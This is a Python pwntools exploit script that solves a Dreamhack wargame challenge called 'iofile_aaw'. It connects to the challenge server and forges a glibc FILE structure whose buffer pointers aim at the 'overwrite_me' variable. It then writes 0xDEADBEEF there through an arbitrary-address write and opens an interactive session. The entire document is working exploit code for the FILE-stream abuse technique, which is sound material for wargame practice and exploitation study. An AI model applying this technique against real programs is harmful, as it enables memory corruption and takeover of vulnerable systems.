#!/usr/bin/env python3
# Name: iofile_aaw.py
import time
from pwn import *
#p = process('./iofile_aaw')
p = remote("host3.dreamhack.games", 8599)
elf = ELF('./iofile_aaw')
overwrite_me = elf.symbols['overwrite_me']
payload = p64(0xfbad2488)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(overwrite_me) # _IO_buf_base
payload += p64(overwrite_me+1024) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) # stdin
p.sendlineafter(b'Data: ', payload)
#time.sleep(1) # controlling the timing between send()
p.send(p64(0xDEADBEEF) + b'\x00'*1024)
p.interactive()